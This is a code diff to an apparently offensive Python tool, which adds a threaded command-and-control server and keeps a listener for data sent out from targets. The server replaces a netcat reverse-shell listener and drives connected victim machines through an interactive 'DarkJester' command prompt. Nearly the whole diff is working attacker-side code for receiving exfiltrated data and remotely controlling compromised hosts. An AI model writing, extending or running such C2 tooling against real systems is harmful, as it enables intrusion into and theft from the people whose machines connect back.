@@ -7,15 +7,17 @@ import sys
 import cgi
 import subprocess
 import time
+import socket
+import threading
 
 if len(sys.argv) != 3:
-    print(f"Usage: {sys.argv[0]} <EXFIL_PORT> <REVERSE_SHELL_PORT>")
+    print(f"Usage: {sys.argv[0]} <EXFIL_PORT> <C2_PORT>")
     sys.exit(1)
 
 IP = "0.0.0.0"
 try:
     EXFIL_PORT = int(sys.argv[1])
-    REVERSE_SHELL_PORT = int(sys.argv[2])
+    C2_PORT = int(sys.argv[2])
 except ValueError:
     print("[!] Port must be an integer.")
     sys.exit(1)
@@ -130,14 +132,58 @@ class CustomHandler(http.server.BaseHTTPRequestHandler):
 def shutdown_server():
     os.kill(os.getpid(), signal.SIGINT)
 
-def start_nc_listener(port):
-    print(f"[+] Starting netcat listener on port {port}...")
+def handle_client(client_socket, addr):
+    print(f"[*] Connection from {addr} established.")
+    print(f"[*] Gaining Interactive Shell....")
+    command_delimiter = "<START>"
+    response_delimiter = "<END>"
     try:
-        subprocess.run(["nc", "-lnvp", str(port)], check=True)
-    except subprocess.CalledProcessError as e:
-        print(f"[-] Error starting netcat: {e}")
-    except KeyboardInterrupt:
-        print(f"[*] Netcat listener stopped.")
+        while True:
+            command = input(f"[*] DarkJester/> ").strip()
+            if command.lower() == 'exit':
+                client_socket.send((command + '\n').encode('utf-8'))
+                break
+            if not command:
+                continue
+            client_socket.send(f"{command_delimiter}{command}\n".encode('utf-8'))
+            response = ""
+            while True:
+                data = client_socket.recv(4096).decode('utf-8', errors='ignore')
+                if not data:
+                    print(f"[*] Client {addr} disconnected")
+                    return
+                response += data
+                if response_delimiter in response:
+                    response = response.split(response_delimiter)[0].strip()
+                    break
+            print(f"[+] Response:\n{response}")
+    except Exception as e:
+        print(f"[*] Error with {addr}: {e}")
+    finally:
+        client_socket.close()
+        print(f"[*] Connection with {addr} closed")
+
+def start_c2_server():
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    try:
+        server.bind((IP, C2_PORT))
+        server.listen(5)
+        print(f"[*] C2 Server listening on {C2_PORT}")
+    except Exception as e:
+        print(f"[*] Failed to start server: {e}")
+        sys.exit(1)
+    while True:
+        try:
+            client_socket, addr = server.accept()
+            client_thread = threading.Thread(target=handle_client, args=(client_socket, addr))
+            client_thread.start()
+        except KeyboardInterrupt:
+            print("\n[*] Shutting down server")
+            break
+        except Exception as e:
+            print(f"[*] Server error: {e}")
+    server.close()
 
 if __name__ == "__main__":
     with socketserver.TCPServer((IP, EXFIL_PORT), CustomHandler) as httpd:
@@ -149,7 +195,7 @@ if __name__ == "__main__":
             except KeyboardInterrupt:
                 httpd.server_close()
         except KeyboardInterrupt:
-            http.server_close()
+            httpd.server_close()
         finally:
             time.sleep(3)
-            start_nc_listener(REVERSE_SHELL_PORT)
+            start_c2_server()
